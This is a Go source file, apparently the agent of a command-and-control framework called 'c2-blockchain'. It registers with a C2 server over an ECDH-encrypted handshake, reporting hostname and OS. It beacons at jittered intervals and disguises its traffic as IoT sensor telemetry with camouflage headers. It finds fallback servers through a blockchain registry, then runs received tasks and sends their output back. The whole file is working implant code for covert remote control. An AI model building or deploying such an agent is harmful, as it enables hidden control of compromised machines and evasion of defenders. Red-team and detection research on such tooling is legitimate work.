package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/joho/godotenv"

	"github.com/ingeleanh/c2-blockchain/internal/agent"
	"github.com/ingeleanh/c2-blockchain/internal/api"
	"github.com/ingeleanh/c2-blockchain/internal/camouflage"
	"github.com/ingeleanh/c2-blockchain/internal/chain"
	"github.com/ingeleanh/c2-blockchain/internal/crypto"
	"github.com/ingeleanh/c2-blockchain/internal/executor"
	"github.com/ingeleanh/c2-blockchain/internal/sim"
)

type agentState struct {
	serverURL      string
	urlCandidates  []string
	agentID        string
	sessionID      string
	sessionKey     []byte
	ecdsaPriv      *ecdsa.PrivateKey
	ecdsaPubHex    string
	sim            *sim.Simulator
	iotGateway     bool
	beaconCount    int
	failover       *agent.Failover
	beaconFailures int
	agentECDH      *ecdsa.PrivateKey
}

func main() {
	_ = godotenv.Load()
	serverURL := strings.TrimRight(envOr("C2_SERVER_URL", "http://localhost:8443"), "/")
	candidates := agent.ParseURLCandidates(serverURL, os.Getenv("C2_URL_CANDIDATES"))
	iotMode := os.Getenv("C2_IOT_GATEWAY") == "true"

	priv, err := crypto.GenerateECDSAKeypair()
	if err != nil {
		log.Fatal(err)
	}
	pubHex := crypto.ECDSAPublicKeyHex(priv)
	agentECDH, err := crypto.GenerateECDHKeypair()
	if err != nil {
		log.Fatal(err)
	}

	cache := chain.NewCache()
	chainReader, _ := chain.NewReader(os.Getenv("C2_RPC_URL"), os.Getenv("C2_REGISTRY_ADDRESS"), cache)

	a := &agentState{
		serverURL:     serverURL,
		urlCandidates: candidates,
		ecdsaPriv:     priv,
		ecdsaPubHex:   pubHex,
		sim:           sim.NewSimulator(),
		iotGateway:    iotMode,
		agentECDH:     agentECDH,
		failover: &agent.Failover{
			Reader:     chainReader,
			Candidates: candidates,
			CurrentURL: serverURL,
		},
	}

	if err := a.connectWithFailover(); err != nil {
		log.Fatal("handshake:", err)
	}

	log.Printf("agent registered: %s (os=%s server=%s)", a.agentID, executor.CurrentOS(), a.serverURL)

	for {
		if err := a.beacon(); err != nil {
			a.beaconFailures++
			log.Printf("beacon error: %v", err)
			if a.beaconFailures >= 2 {
				a.tryFailoverReconnect()
			}
		} else {
			a.beaconFailures = 0
		}
		a.failover.CurrentURL = a.serverURL
		time.Sleep(camouflage.BeaconInterval(5, 10))
	}
}

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

func (a *agentState) connectWithFailover() error {
	a.alignServerFromChain()
	firstErr := a.handshake()
	if firstErr == nil {
		return nil
	}
	log.Printf("primary handshake failed: %v — trying chain failover", firstErr)
	if a.tryFailoverReconnect() {
		return nil
	}
	return firstErr
}

func (a *agentState) alignServerFromChain() {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	url, cfg, err := chain.ResolveVerifiedURL(ctx, a.failover.Reader, a.urlCandidates)
	if err != nil || url == "" {
		return
	}
	if url != a.serverURL {
		log.Printf("chain v%d: endpoint verificado on-chain → %s", cfg.Version, url)
		a.serverURL = url
		a.failover.CurrentURL = url
	}
}

func (a *agentState) tryFailoverReconnect() bool {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	newURL, cfg, ok := a.failover.Attempt(ctx)
	if !ok {
		return false
	}
	log.Printf("failover: chain v%d verified endpoint → %s", cfg.Version, newURL)
	a.serverURL = newURL
	a.failover.CurrentURL = newURL
	agentECDH, err := crypto.GenerateECDHKeypair()
	if err != nil {
		log.Printf("failover: ecdh: %v", err)
		return false
	}
	a.agentECDH = agentECDH
	if err := a.handshake(); err != nil {
		log.Printf("failover handshake failed: %v", err)
		return false
	}
	a.beaconFailures = 0
	log.Printf("failover: re-registered agent %s on %s", a.agentID, a.serverURL)
	return true
}

func (a *agentState) handshake() error {
	resp, err := http.Post(a.serverURL+"/api/v1/agents/handshake", "application/json",
		bytes.NewReader([]byte(`{"step":"challenge_request"}`)))
	if err != nil {
		return err
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("handshake step 1: status %d body: %s", resp.StatusCode, string(body))
	}
	var ch map[string]interface{}
	if err := json.Unmarshal(body, &ch); err != nil {
		return fmt.Errorf("handshake step 1: %w (body: %s)", err, string(body))
	}
	nonce, _ := ch["nonce"].(string)
	serverECDHPub, _ := ch["server_ecdh_pub"].(string)

	sig, err := crypto.SignNonce(a.ecdsaPriv, nonce)
	if err != nil {
		return err
	}
	pubBytes := crypto.MarshalECDHPublicKeySPKI(&a.agentECDH.PublicKey)
	reqBody := map[string]interface{}{
		"step":            "challenge_response",
		"nonce":           nonce,
		"agent_ecdsa_pub": a.ecdsaPubHex,
		"agent_ecdh_pub":  base64.StdEncoding.EncodeToString(pubBytes),
		"signature":       sig,
		"hostname":        executor.Hostname(),
		"os":              executor.CurrentOS(),
		"timestamp":       time.Now().Unix(),
	}
	if a.iotGateway {
		reqBody["agent_role"] = "iot_gateway"
		reqBody["gateway_id"] = "gw-01"
	}
	b, _ := json.Marshal(reqBody)
	resp2, err := http.Post(a.serverURL+"/api/v1/agents/handshake", "application/json", bytes.NewReader(b))
	if err != nil {
		return err
	}
	body2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	var complete map[string]interface{}
	if err := json.Unmarshal(body2, &complete); err != nil {
		return fmt.Errorf("handshake step 2: %w (body: %s, status: %d)", err, string(body2), resp2.StatusCode)
	}
	if complete["step"] != "complete" {
		return fmt.Errorf("handshake failed: %s", string(body2))
	}
	a.agentID = complete["agent_id"].(string)
	a.sessionID = complete["session_key_id"].(string)

	serverPubBytes, err := base64.StdEncoding.DecodeString(serverECDHPub)
	if err != nil {
		return err
	}
	serverPub, err := crypto.UnmarshalECDHPublicKeySPKI(a.agentECDH.Curve, serverPubBytes)
	if err != nil {
		return err
	}
	shared, err := crypto.ECDHSharedSecret(a.agentECDH, serverPub)
	if err != nil {
		return err
	}
	a.sessionKey, err = crypto.DeriveSessionKey(shared, "c2-session-v1")
	return err
}

func (a *agentState) beacon() error {
	var plainPayload map[string]interface{}
	if a.iotGateway {
		a.beaconCount++
		switch a.beaconCount % 3 {
		case 0:
			plainPayload = a.sim.MotionEvent("lobby")
		case 1:
			plainPayload = a.sim.Telemetry("meter-energy-01", 8.2+a.sim.Float())
		default:
			plainPayload = map[string]interface{}{
				"type":      "beacon",
				"agent_id":  a.agentID,
				"timestamp": time.Now().Unix(),
				"status":    "idle",
			}
		}
	} else {
		plainPayload = map[string]interface{}{
			"type":      "beacon",
			"agent_id":  a.agentID,
			"timestamp": time.Now().Unix(),
			"status":    "idle",
		}
	}
	plain, _ := json.Marshal(plainPayload)
	var enc crypto.Envelope
	if err := enc.Encrypt(a.sessionKey, plain); err != nil {
		return err
	}
	reqBody, _ := json.Marshal(map[string]interface{}{"encrypted": enc})
	url := fmt.Sprintf("%s/api/v1/agents/%s/beacon", a.serverURL, a.agentID)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(reqBody))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Session-Key-Id", a.sessionID)
	req.Header.Set("X-Agent-Id", a.agentID)
	for k, v := range camouflage.IoTHeaders() {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var out map[string]interface{}
	json.Unmarshal(body, &out)
	encRaw, ok := out["encrypted"]
	if !ok {
		return nil
	}
	encBytes, _ := json.Marshal(encRaw)
	var envelope crypto.Envelope
	json.Unmarshal(encBytes, &envelope)
	taskPlain, err := envelope.Decrypt(a.sessionKey)
	if err != nil {
		return err
	}
	var taskMsg map[string]interface{}
	json.Unmarshal(taskPlain, &taskMsg)
	if taskMsg["type"] != "task" {
		return nil
	}
	payload, _ := taskMsg["payload"].(map[string]interface{})
	cmdType, _ := taskMsg["command_type"].(string)
	res := api.ExecuteTaskOnAgent(context.Background(), a.sim, cmdType, payload)
	resultPlain, _ := json.Marshal(map[string]interface{}{
		"type":      "task_result",
		"task_id":   taskMsg["task_id"],
		"exit_code": res.ExitCode,
		"stdout":    res.Stdout,
		"stderr":    res.Stderr,
		"timestamp": time.Now().Unix(),
	})
	var resEnc crypto.Envelope
	resEnc.Encrypt(a.sessionKey, resultPlain)
	resBody, _ := json.Marshal(map[string]interface{}{"encrypted": resEnc})
	resultURL := fmt.Sprintf("%s/api/v1/agents/%s/task_result", a.serverURL, a.agentID)
	req2, _ := http.NewRequest(http.MethodPost, resultURL, bytes.NewReader(resBody))
	req2.Header.Set("Content-Type", "application/json")
	req2.Header.Set("X-Session-Key-Id", a.sessionID)
	http.DefaultClient.Do(req2)
	return nil
}
